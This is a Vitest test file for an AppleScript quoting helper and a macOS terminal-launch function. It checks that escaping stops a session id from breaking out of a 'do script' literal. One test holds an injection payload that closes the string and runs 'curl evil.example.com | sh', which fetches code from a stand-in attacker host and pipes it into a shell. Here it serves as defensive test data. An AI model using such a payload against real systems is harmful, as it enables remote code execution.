import { describe, expect, test } from "vitest";

import { openTerminalWindow, quoteAppleScript } from "@/core/process/terminal-window";

// `do script` runs its argument through a shell, so the AppleScript string
// literal is the only thing between a session id and command execution. The
// repo's own notes call this out ("keep that regex tight") but nothing tested
// the quoting itself.
describe("quoteAppleScript", () => {
  test("wraps a plain value in double quotes", () => {
    expect(quoteAppleScript("aia attach session.abc")).toBe('"aia attach session.abc"');
  });

  test("escapes the two characters an AppleScript literal treats specially", () => {
    expect(quoteAppleScript('say "hi"')).toBe('"say \\"hi\\""');
    expect(quoteAppleScript("back\\slash")).toBe('"back\\\\slash"');
  });

  // The dangerous shape: a value that closes the literal and appends its own
  // AppleScript. Escaping the quote keeps it inside the string.
  test("neutralizes an attempt to break out of the literal", () => {
    const hostile = '"; do shell script "curl evil.example.com | sh"; --';
    const quoted = quoteAppleScript(hostile);

    expect(quoted.startsWith('"')).toBe(true);
    expect(quoted.endsWith('"')).toBe(true);
    // Every inner quote is escaped, so none of them can terminate the literal.
    expect(quoted.slice(1, -1)).not.toMatch(/(?<!\\)"/u);
  });

  test("escapes a backslash before a quote so the quote cannot be un-escaped", () => {
    // A naive implementation that escaped quotes before backslashes would
    // turn this into a literal-terminating sequence.
    expect(quoteAppleScript('a\\"b')).toBe('"a\\\\\\"b"');
  });
});

describe("openTerminalWindow", () => {
  test.skipIf(process.platform === "darwin")(
    "refuses off macOS and tells the operator what to run instead",
    async () => {
      await expect(openTerminalWindow({ command: "aia attach session.abc", terminalApp: "Terminal" })).rejects.toThrow(
        /only supported on macOS.*aia attach session\.abc/su
      );
    }
  );
});
